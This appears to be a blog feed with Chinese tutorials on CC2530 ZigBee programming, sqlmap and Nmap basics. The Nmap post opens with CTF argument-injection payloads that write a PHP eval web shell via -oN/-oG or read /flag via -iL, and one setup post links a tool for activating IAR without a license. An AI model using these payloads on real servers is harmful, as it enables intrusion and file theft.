&amp;&#x3D;~0x0C;&#x2F;&#x2F;xxxx 00xx  配置为普通IO模式    P1DIR |&#x3D;0x0C;&#x2F;&#x2F;xxxx 11xx   配置为输出模式&#125;void LS164_BYTE(UCHAR Index) &#x2F;&#x2F;P1.3  DATA   P1.2  CLK&#123;      UCHAR i&#x3D;0;    UCHAR Data&#x3D;LED_Map[Index];    for(;i&lt;8;i++)    &#123;        if(0x80 &amp; Data)        &#123;            LS164_DATA&#x3D;1;                    &#125;        else        &#123;            LS164_DATA&#x3D;0;         &#125;        Data&#x3D;Data &lt;&lt; 1;        LS164_CLK&#x3D;0;        LS164_CLK&#x3D;1;    &#125;&#125;</code></pre><h1 id="USB转串口配置"><a href="#USB转串口配置" class="headerlink" title="USB转串口配置"></a>USB转串口配置</h1><p>CC2530具备两个串口，且每个串口都可以配置选择控制脚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-0.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-91.png" alt loading="lazy"></p><p><strong>步骤：</strong></p><p>1、指定串口的IO位置</p><pre class="language-c" data-language="c"><code class="language-c">PERCFG &amp;&#x3D;0xFE;&#x2F;&#x2F;1111 1110 选中串口0的的备用位置1</code></pre><p>2、相应IO配置成偏上外设功能</p><pre class="language-c" data-language="c"><code class="language-c">P0SEL |&#x3D;0x0C;       &#x2F;&#x2F;0000 1100 P0_2 p0_3为偏上外设功能</code></pre><p>3、8个数据位，1个停止位，无流控，无校验确立</p><pre class="language-c" data-language="c"><code class="language-c">U0CSR |&#x3D;0Xc0;</code></pre><p>4、波特率设置</p><pre class="language-c" data-language="c"><code class="language-c">U0GCR &#x3D;8;U0BAUD&#x3D;59;</code></pre><img src="https://gitee.com/Extrader/blogimage/raw/master/image/时钟，串口配置/image-95.png" style="zoom: 80%;" loading="lazy"><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-92-e1579148396866.png" alt loading="lazy"></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/时钟，串口配置/image-94.png" style="zoom:67%;" loading="lazy"><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-93.png" alt loading="lazy"></p><p>5、开CPU中断，对应串口接收中断</p><pre class="language-c" data-language="c"><code class="language-c">EA&#x3D;1;URX0IE&#x3D;1;&#x2F;&#x2F;结尾为0或8则可以直接选择赋值</code></pre><p>USART0接收字符利用中断服务函数</p><ul><li><p>当一个字节由串口接收到C2530，字节会保存到U0DBUF寄存器，同时接收中断标志URX0IF位会置1</p></li><li><p>可以利用中断服务程序来接收该字符串</p></li><li><p>中断服务函数</p><p>#pragma vector = URX0_VECTOR<br>__interrupt void UART0_ISR(void)</p></li></ul><h1 id="总测试代码"><a href="#总测试代码" class="headerlink" title="总测试代码"></a><strong>总测试代码</strong></h1><pre class="language-c" data-language="c"><code class="language-c">#include &lt;iocc2530.h&gt;char ch;void Cfg32M()&#123;    SLEEPCMD &amp;&#x3D;0xFB; &#x2F;&#x2F;fB 0 00 让2个时钟源都起振    while(0&#x3D;&#x3D;(SLEEPSTA &amp; 0x40));  &#x2F;&#x2F;  0100 0000  如果32M 晶振供电且稳定了，那么程序往下运行    CLKCONCMD &amp;&#x3D;0xF8; &#x2F;&#x2F;1111 1000 不分频输出    CLKCONCMD &amp;&#x3D;0xBF;&#x2F;&#x2F;1011 1111 让32M作为系统主时钟供给CPU    while(1&#x3D;&#x3D;(CLKCONSTA &amp; 0x40));&#x2F;&#x2F;如果32M确实供给CPU在工作，那么程序往下执行    SLEEPCMD |&#x3D;0x40;&#x2F;&#x2F; 0000 0100 &#125;void UartCfg()&#123;&#x2F;&#x2F;串口0的备用位置1配置成波特率9600   PERCFG &amp;&#x3D;0xFE;&#x2F;&#x2F;1111 1110 选中串口0的的备用位置1   P0SEL  |&#x3D;0x0C;       &#x2F;&#x2F;0000 1100 P0_2 p0_3为偏上外设功能   U0CSR |&#x3D;0Xc0;   U0GCR &#x3D;8;   U0BAUD&#x3D;59;   EA&#x3D;1;   URX0IE&#x3D;1;&#125;void main()&#123;  Cfg32M();  UartCfg();    while(1);&#125;#pragma vector&#x3D;URX0_VECTOR&#x2F;&#x2F;中断服务函数__interrupt void UART0_ISR(void)&#123;    URX0IF&#x3D;0;&#x2F;&#x2F;串口0来数据的标志位，硬件会置1，我们软件要清0    ch&#x3D;U0DBUF;&#x2F;&#x2F;从接受寄存器里取字节存入变量ch    U0DBUF&#x3D;ch;&#x2F;&#x2F;把变量ch里的值赋给串口0发送数据寄存器    while(0&#x3D;&#x3D;UTX0IF);    UTX0IF&#x3D;0;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO控制与外部中断</title>
      <link href="/posts/4344df18/"/>
      <url>/posts/4344df18/</url>
      
        <content type="html"><![CDATA[<p>CC2530只具备<a href="https://baike.baidu.com/item/QFN%E5%B0%81%E8%A3%85/5168878?fr=aladdin">QFN</a>40封装 工作范围：2~3.6V(推荐选3.3V)</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-67.png" alt loading="lazy"></p><p>一共有21个通用IO口，其中这21个分为3组P0\P1\P2； 其中P0\P1组各8个IO，P2组5个（P2_0、P2_1、 P2_2、P2_3、 P2_4）。</p><p>这些口子都可以作为普通或对应的片上外设控制。</p><p>其中P1_0 P1_1有20mA的输出驱动能力，其余的只有4mA</p><p>PxSEL、PxDIR、PxINP Px（x分别对应0、1、2,用来控制对应的IO口组）3种寄存器；复位、默认都是0</p><a id="more"></a><h1 id="PxSEL寄存器"><a href="#PxSEL寄存器" class="headerlink" title="PxSEL寄存器"></a>PxSEL寄存器</h1><p>PxSEL寄存器作用: 有8位，每一位对应具体的IO组中的相应的一个IO，决定它是普通IO口还是片上外设，0表示普通IO口，1表示片上外设。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-68.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-69.png" alt loading="lazy"></p><h1 id="PxDIR寄存器"><a href="#PxDIR寄存器" class="headerlink" title="PxDIR寄存器"></a>PxDIR寄存器</h1><p>PxDIR寄存器作用: 有8位，每一位对应具体的IO组中的相应的一个IO，决定它是输入还是输出，0表示输入，1表示输出。</p><p>特别注意：其中P2组只有5个IO口，低五位也对应P2_0 … P2_4 后面的位不用管。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-70.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-71.png" alt loading="lazy"></p><h1 id="PxINP寄存器"><a href="#PxINP寄存器" class="headerlink" title="PxINP寄存器"></a>PxINP寄存器</h1><p>PxINP寄存器作用: 在输入的时候，8位，每一位对应具体的IO组中的相应的一个IO，决定它是上下拉模式还是三态，0表示上下拉模式，1表示三态。</p><p>特别注意：其中P2组只有5个IO口，低五位也对应P2_0 … P2_4 ，后面的3位决定在配置为上下拉模式的时候，组为上拉 还是下拉，0表示上拉，1表示下拉。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-72.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-73.png" alt loading="lazy"></p><h1 id="EA"><a href="#EA" class="headerlink" title="EA"></a>EA</h1><p>总CPU开关中断，令其为1则为开关闭合</p><h1 id="PxIE"><a href="#PxIE" class="headerlink" title="PxIE"></a>PxIE</h1><p>组使能位，控制PxIEN</p><p>注意：可以直接令P0IE=1，若要设置P1IE为1，则令IEN2 |=0x10；相当于P1IE=1</p><h1 id="PxIEN"><a href="#PxIEN" class="headerlink" title="PxIEN"></a>PxIEN</h1><p>对应的中断使能标志位，使用方法：PxIEN |= 0x__；为1则为闭合</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-74.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-75.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-76.png" alt loading="lazy"></p><h1 id="PICTL寄存器"><a href="#PICTL寄存器" class="headerlink" title="PICTL寄存器"></a>PICTL寄存器</h1><p>0代表上升沿，1代表下降沿。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-77.png" alt loading="lazy"></p><h1 id="PxIFG"><a href="#PxIFG" class="headerlink" title="PxIFG"></a>PxIFG</h1><p>中断状态标志寄存器, 当发生中断时，相应位将被置1</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-79.png" alt loading="lazy"></p><h1 id="中断函数"><a href="#中断函数" class="headerlink" title="中断函数"></a>中断函数</h1><p>pragma vector=PxINT_VECTOR（x=0,1,2）</p><pre class="language-c" data-language="c"><code class="language-c">pragma vector&#x3D;PxINT_VECTOR（x&#x3D;0,1,2）__interrupt  void  fn()&#123;PxIFG&#x3D;0; PxIF&#x3D;0;&#125;</code></pre><p>函数最后需要将PxIFG和PxIF清零。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-78.png" alt loading="lazy"></p><p>最后附上一段能够按按钮控制灯亮灭的代码</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;iocc2530.h&gt;void delay()&#123;   int i,j;   for(i&#x3D;0;i&lt;1000;i++)     for(j&#x3D;0;j&lt;30;j++);&#125;void main()&#123;   P0SEL &amp;&#x3D;0xDF;&#x2F;&#x2F; 1101 1111 &#x2F;&#x2F;P0_5设置为普通IO口  P0DIR &amp;&#x3D;0xDF;&#x2F;&#x2F; 1101 1111 &#x2F;&#x2F;P0_5设置为输入  P0INP &amp;&#x3D;0xDF;&#x2F;&#x2F; 1101 1111 &#x2F;&#x2F;P0_5设置为上下拉模式  P2INP &amp;&#x3D;0xDF;&#x2F;&#x2F; 1101 1111 &#x2F;&#x2F;P0组配置成上拉模式  EA&#x3D;1;&#x2F;&#x2F;闭合总CPU  P0IE&#x3D;1;&#x2F;&#x2F;P1IE如果要设置为1，那么我们不能直接用P1IE&#x3D;1,IEN2 |&#x3D;0x10;&#x2F;&#x2F; 0001 0000  &#x2F;&#x2F;IEN2 |&#x3D;0x10;&#x2F;&#x2F;相当于P1IE&#x3D;1  P0IEN |&#x3D;0X20;&#x2F;&#x2F; 0010 0000 设置3个中断使能标志位，让相应的中断开关合上  PICTL |&#x3D;0x01;&#x2F;&#x2F;把P0这一组配置成下降沿触发&#x2F;&#x2F;PICTL |&#x3D;0x02则为把P1组配置成下降沿  P1DIR |&#x3D;0X01;&#x2F;&#x2F;配置P1_0位输出  while(1);&#x2F;&#x2F;死循环，不结束函数&#125;#pragma optimize&#x3D;none#pragma vector&#x3D;P0INT_VECTOR__interrupt void fsdfas()&#123;    if(P0IFG &amp; 0x20)&#x2F;&#x2F; 0010 0000    &#123;&#x2F;&#x2F;P0组的第5位 P0_5引发了外部中断        delay();        if(0&#x3D;&#x3D;P0_5)        &#123;&#x2F;&#x2F;说明确实是连接在P0_5的按钮触发了外部中断           P1_0 ^&#x3D;1;&#x2F;&#x2F;异或操作        &#125;    &#125;    P0IFG&#x3D;0;     P0IF&#x3D;0;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZigBee入门</title>
      <link href="/posts/1dea566/"/>
      <url>/posts/1dea566/</url>
      
        <content type="html"><![CDATA[<ul><li>学习ZigBee不仅仅是学习控制器本身，还要掌握一堆叫做协议栈的代码和网络的一些相关东西</li></ul><p>ZigBee是无线设备之间的一种通信方式，类似于任人和人之间的普通话交流，普通话就是一种通信方式</p><p>ZigBee，ZigBee通信方式，ZigBee协议这三者没任何区别，只是说法不同而已</p><p>ZigBee的作用就是用于无线模块和模块之间的通信，构建无线局域网</p><p>无线传感网络：如果这个无线局域网用于传感器的数据收集和监控，那么这个网络就叫做无线传感器网络，是无线局域网的一种具体应用</p><p>引入ZigBee通信方式的原因：</p><ul><li>WiFi：通信速率大，功耗大等</li><li>蓝牙：功耗小，组网的节点数较少</li><li>ZigBee：可以组件大规模的网络，功耗低（TI CC2530 正常工作电流8mA，最低工作达到几个uA），缺点为通信速率小，MAX=250KB</li></ul><p>此次使用的是CC2530芯片</p><a id="more"></a><h1 id="环境的安装和搭建"><a href="#环境的安装和搭建" class="headerlink" title="环境的安装和搭建"></a>环境的安装和搭建</h1><p>工作环境IAR的安装：</p><p><a href="https://pan.baidu.com/s/1YvVTsz7ZBu1c3FSTDQVjVA">下载链接</a>，提取码：vbzy</p><p>使用注册工具激活：</p><p><a href="https://pan.baidu.com/s/1iCz3AGJwQPoXLJ5Uf5rHwQ">下载链接</a>，提取码：2c5p</p><p>注意：Win7以上的系统激活的时候需要右键以管理员方式运行软件，否则会在后面的编译代码的过程中出现错误，<a href="https://zhidao.baidu.com/question/447439875.html">详见链接</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/u83GDwMvLFlJB2W.png" style="zoom:50%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/aJf8yK4ZkPORcSX.png" style="zoom:50%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/IrqQgWvn1JaZCz7.png" style="zoom:50%;" loading="lazy"><p>如图所示激活操作，其余操作只需next即可</p><h1 id="新建工程文件"><a href="#新建工程文件" class="headerlink" title="新建工程文件"></a>新建工程文件</h1><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/YM1nrkzWNiZh3KL.png" style="zoom:50%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/hKd4nOpzQ8c6DqH.png" style="zoom:50%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/M7zojwX6V3TRxg9.png" style="zoom:50%;" loading="lazy"><p>C语言.c文件建立与保存</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/2yUOpqJR5MWLecm.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/P5ECVbMHxGUvI69.png" style="zoom:50%;" loading="lazy"><p>将文件添加到工程中：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/Er96gzcCAYIORKk.png" style="zoom:50%;" loading="lazy"><p>写入代码：</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;iocc2530.h&gt;void main()&#123;  P1DIR |&#x3D;0X01;&#x2F;&#x2F;让P_0为输出  P1_0&#x3D;1;&#x2F;&#x2F;0为低电平，使二极管发光，1为高电平  while(1);&#125;</code></pre><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/htJEQRjI3Dfepy4.png" style="zoom:50%;" loading="lazy"><p>点击编译：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/RmyKXTsE79GHuOl.png" style="zoom:50%;" loading="lazy"><p>在弹出的框框中给工程工作空间命名：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/j3tPOgkvs1MpoEr.png" style="zoom:50%;" loading="lazy"><p>保存，编译通过</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/b8COxYTdSlU5sIV.png" style="zoom:50%;" loading="lazy"><p>以下为工程目录中各文件的介绍：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/JzwFsD25EGR9S4C.png" style="zoom:50%;" loading="lazy"><h1 id="ZigBee仿真器"><a href="#ZigBee仿真器" class="headerlink" title="ZigBee仿真器"></a>ZigBee仿真器</h1><p>仿真与下载程序用到的一种硬件</p><p>需啊在Windows环境下安装驱动才可以使用</p><p><a href="https://pan.baidu.com/s/1cM9o3uMKPdgISDyFvodyMg">驱动下载链接</a>，提取码：3gbw</p><p>在电脑USB端口插上仿真器，打开设备管理器，右键新加进来的前面有黄色感叹号的标致，点击更新驱动</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/uCKOXfbs7zI5GaM.png" style="zoom:50%;" loading="lazy"><p>点击浏览定位到驱动文件夹，随后下一步安装即可</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/WafLPxBkTDVo4vM.png" style="zoom:50%;" loading="lazy"><p>随后进行下载操作（即将程序下载到板子里）</p><h1 id="下载前的配置操作"><a href="#下载前的配置操作" class="headerlink" title="下载前的配置操作"></a>下载前的配置操作</h1><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/ANBYtOsRPDoSCHQ.png" style="zoom:50%;" loading="lazy"><p>器件选择：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/yMp4BiOlKfHmPq3.png" style="zoom:50%;" loading="lazy"><p>点击后弹出一个文件夹，此文件夹在IAR软件的安装目录下</p><p>选择–&gt;Texas Instruments–&gt;CC2530F256，打开即可</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/k8Cwd32T9RKJlWy.png" style="zoom:50%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/OaqwEvyUFskYjpV.png" style="zoom:50%;" loading="lazy"><p>Linker连接配置：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/M8GDpaRTysNzZhE.png" style="zoom:50%;" loading="lazy"><p>Debugger选择：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/i9jpoArZXJbNlcU.png" style="zoom:50%;" loading="lazy"><p>点击OK后即可下载到板子中</p><p>点击顺序如下：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/yUYRqJVPsxOf97B.png" style="zoom:50%;" loading="lazy"><p>以下为各个图标所代表的含义：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/YH5QhtF6EwV7AS3.png" style="zoom:50%;" loading="lazy"><h1 id="导出为Hex镜像文件供他人使用"><a href="#导出为Hex镜像文件供他人使用" class="headerlink" title="导出为Hex镜像文件供他人使用"></a>导出为Hex镜像文件供他人使用</h1><p>需要用到SmartRF flash programmer这款软件</p><p><a href="https://pan.baidu.com/s/1TyV7qdPfyicisiA6sISpzg">下载链接</a>，提取码：n4br</p><p>点击安装即可，安装完成后桌面会出现以下图标，点击即可打开应用</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee%E5%85%A5%E9%97%A8/MDvHk5m8SolWeKB.png" alt loading="lazy"></p><p>另外需要在IAR中导出后缀为.Hex的文件</p><p>在输入框中输入你想命名的.Hex文件（注：格式为文件名+.hex）</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/8jDiUsRfWE7ZKbQ.png" style="zoom:50%;" loading="lazy"><p>另外在Output format处选择intel-extended，OK即可</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/bkgJFvfWYCnoROD.png" style="zoom:50%;" loading="lazy"><p>随后编译，可看见在此目录下多了一个a.hex的文件</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/lfVyDi1gH8e2TrB.png" style="zoom:50%;" loading="lazy"><p>在 SmartRF flash programmer 软件的flash image中选择到此文件，点击perform action，即可将文件烧到板子里面去</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ZigBee入门/F2XMEWZfcy7vSJQ.png" style="zoom:50%;" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用</title>
      <link href="/posts/c06d8347/"/>
      <url>/posts/c06d8347/</url>
      
        <content type="html"><![CDATA[<p>以下图来自XBX白细胞安全团队（LEUKOCYTE）（侵删）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113716744.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113746488.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113842327.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113914099.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113941052.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114009522.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114036397.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114108504.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114130551.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114151354.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114225256.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114248814.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114310504.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114329273.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114403009.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114427824.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114451429.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114513110.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114537281.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114559948.png" alt loading="lazy"><br><img src="https://gitee.com/Extrader/blogimage/raw/master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114635757.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap的基础使用</title>
      <link href="/posts/e1005ac/"/>
      <url>/posts/e1005ac/</url>
      
        <content type="html"><![CDATA[<p>一些关于nmap命令执行的题目payload</p><p><code>&#39; -oN b.phtml &lt;?=eval($_POST[a]);?&gt;&#39;</code></p><p><code>&#39; -iL /flag -oN flag.txt &#39;</code></p><p><code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p><p>nmap这个渗透工具一般有在渗透的准备阶段，用于收集用户的信息，为后面的渗透做情报支持</p><p>Nmap是主机扫描工具，他的图形化界面是Zenmap，分布式框架为Dnmap。</p><p>Nmap可以完成以下任务：</p><ul><li>主机探测</li><li>端口扫描</li><li>版本检测</li><li>系统检测</li><li>支持探测脚本的编写</li></ul><a id="more"></a><p>Nmap在实际中应用场合如下：</p><ul><li>通过对设备或者防火墙的探测来审计它的安全性</li><li>探测目标主机所开放的端口</li><li>通过识别新的服务器审计网络的安全性</li><li>探测网络上的主机</li></ul><p>常见服务对应端口号：</p><table><thead><tr><th align="center"><strong>服务</strong></th><th align="center"><strong>端口号</strong></th></tr></thead><tbody><tr><td align="center">HTTP</td><td align="center">80</td></tr><tr><td align="center">HTTPS</td><td align="center">443</td></tr><tr><td align="center">Telnet（远程登录）</td><td align="center">23</td></tr><tr><td align="center">SSH（安全登录），SCP（文件传输），端口重定向</td><td align="center">22</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/SMTP/175887?fr=aladdin">SMTP</a>（简单邮件传输协议）</td><td align="center">25</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/POP3/175122?fr=aladdin">POP3</a>（ 邮局协议版本3 ）</td><td align="center">110</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/weblogic/451978?fr=aladdin">WebLogic</a></td><td align="center">7001</td></tr><tr><td align="center"><a href="https://baike.baidu.com/item/tomcat/255751?fr=aladdin">TOMCAT</a>（ Java Web服务器 ）</td><td align="center">8080</td></tr><tr><td align="center">WIN2003远程登录</td><td align="center">3389</td></tr><tr><td align="center">Oracle数据库</td><td align="center">1521</td></tr><tr><td align="center">MY SQL SERVER数据库</td><td align="center">1433</td></tr><tr><td align="center">MySQL数据库</td><td align="center">3306</td></tr></tbody></table><p>在kali中使用：命令行nmap即可使用</p><p>nmap -version即可查看nmap的版本信息</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-27.png" alt loading="lazy"></p><p>扫描简单来说就是四个动作</p><ul><li>统一沟通语言（TCP/IP协议）</li><li>发出刺激（ICMP报文头）</li><li>受到刺激的反馈（ICMP的反馈）</li><li>通过比对刺激和反馈完成扫描</li></ul><p>说实话这四个动作具体是啥意思我也不是很明白</p><p>将你要扫描的设备地址告诉nmap可以通过下面的方法实现统一的格式</p><ul><li>namp [扫描类型] [设置] {设备地址}</li></ul><p><strong>nmap常用的参数及意义</strong></p><ol><li>-A ：选择用于使用进攻性方式扫描；全面系统检测，启用脚本检测，扫描。（推荐）</li><li>-T4：指定扫描过程使用的时序，表示禁止动态扫描延时超过的时间；总共有6个级别（0-5）。级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4 。*（ 假如防火墙是一幢大楼的门锁，那么IDS就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。 ）（推荐）</li><li>-oX test.xml：将扫描结果生成test.xml文件</li><li>-oG test.txt：将扫描结果生成test.txt文件</li><li>-sn：只进行主机发现，不进行端口扫描</li><li>-O：指定Nmap进行系统版本扫描</li><li>-sV：指定Nmap进行服务版本扫描</li><li>-p <code>&lt;port ranges&gt;</code>：扫描指定的端口</li><li>-sS/sT/sA/sW/sM：指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描</li><li>-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况</li><li>-script  <code>&lt;script name&gt;</code> : 指定扫描脚本</li><li>-Pn ： 不进行ping扫描（推荐）</li><li>-sP : 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping</li><li>-PI : 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。</li><li>-iL 1.txt : 批量扫描1.txt中的目标地址</li><li>-sL: List Scan 